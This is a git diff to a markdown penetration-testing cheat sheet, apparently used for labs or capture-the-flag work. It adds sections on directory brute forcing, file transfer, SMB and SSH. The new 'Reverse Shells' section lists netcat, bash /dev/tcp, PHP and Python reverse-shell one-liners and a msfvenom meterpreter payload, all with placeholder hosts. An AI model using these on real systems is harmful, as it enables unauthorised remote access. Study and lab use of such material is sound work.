@@ -192,8 +192,29 @@ CdThmVpn
 
 <br>
 
-### Basic Commands
-#### Create a directory to store results of scans
+### Directory Brute Force
+#### Gobuster
+```shell
+gobuster dir -u http://<IP>/ -w ../../Tools/KaliWordlists/dirbuster/directory-list-2.3-medium.txt -o scans/gobuster_1.txt -x .php,.html,.txt
+```
+
+#### Dirb
+```shell
+dirb http://<IP> -w ../../Tools/KaliWordlists/dirbuster/directory-list-2.3-medium.txt -w -X .php,.html,.txt | tee scans/dirb_1.txt
+```
+
+<br>
+
+### Git
+#### Associate a file in your repository with Git LFS
+```shell
+git lfs track "*.<FILETYPE>"
+```
+
+<br>
+
+### Manipulate Files & Directories
+#### Create a directory
 ```shell
 mkdir scans
 ```
@@ -217,28 +238,41 @@ chmod 600 id_rsa
 chmod X+ lse.sh
 ```
 ```shell
-chmod u+s <FILENAME>
+chmod u+s <FILE_NAME>
 ```
 
-<br>
-
-### Directory Brute Force
-#### Gobuster
+#### Move Files
 ```shell
-gobuster dir -u http://<IP>/ -w ../../Tools/KaliWordlists/dirbuster/directory-list-2.3-medium.txt -o scans/gobuster_1.txt -x .php,.html,.txt
+mv <SOURCE_FILE> <DESTINATION_FILE>
 ```
 
-#### Dirb
+#### Copy
 ```shell
-dirb http://<IP> -w ../../Tools/KaliWordlists/dirbuster/directory-list-2.3-medium.txt -w -X .php,.html,.txt | tee scans/dirb_1.txt
+cp <PATH/SOURCE_FILE> <PATH/DESTINATION_FILE>
+```
+```shell
+cp --recursive <SOURCE_FOLDER> <DESTINATION_FOLDER>
 ```
 
-<br>
-
-### Git
-#### Associate a file in your repository with Git LFS
+#### Upload
 ```shell
-git lfs track "*.<FILETYPE>"
+scp <SOURCE_FILE> <USER>@<IP>:<DESTINATION_PATH>
+```
+```shell
+curl --upload-file <FILE> -u '<USER>' smb://<IP>/<SHARE_NAME>/
+```
+
+#### Download
+```shell
+scp <USER>@<IP>:<SOURCE_FILE> <DESTINATION_PATH>
+```
+```shell
+wget “http://<IP>:<PORT>/<RESOURCE>" -O <OUTPUT_NAME>
+```
+
+#### Append to end of file
+```shell
+echo "<TEXT>" >> <FILE>
 ```
 
 <br>
@@ -401,6 +435,75 @@ export PS1="\n\[$(tput sgr0)\]\[\033[38;5;2m\]┌──(\[$(tput sgr0)\]\[$(tput
 ```
 ```shell
 ../../Tools/linux-smart-enumeration/lse.sh
+```
+
+<br>
+
+### Reverse Shells
+#### Listen
+```shell
+nc -lnvp <PORT>
+```
+
+#### Netcat
+```shell
+nc <IP> <PORT> -c bash
+```
+
+#### Bash
+```shell
+/bin/bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
+```
+
+#### PHP
+```php
+<?php exec(“/bin/bash -c ‘bash -i >& /dev/tcp/<IP>/<PORT> 0>&1’”); phpinfo(); ?>
+```
+
+#### Python
+```shell
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+```
+
+#### Metasploit Reverse TCP Windows
+```shell
+msfvenom -p  windows/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f exe -o ./reverseshell.exe
+```
+
+<br>
+
+### SMB
+#### See what shares are on the host
+```shell
+smbclient -L <IP>
+```
+```shell
+smbmap -H <IP>
+```
+
+#### Connect
+```shell
+smbclient //<IP>/<SHARE_NAME>
+```
+```shell
+smbclient //<IP>/<SHARE_NAME> -U <USERNAME> <PASSWORD>
+```
+
+<br>
+
+### SSH
+```shell
+ssh <USER>@<IP>
+```
+```shell
+ssh -i id_rsa <USER>@<IP>
+```
+
+<br>
+
+### Webserver
+```shell
+python3 -m http.server
 ```
 
 <br>
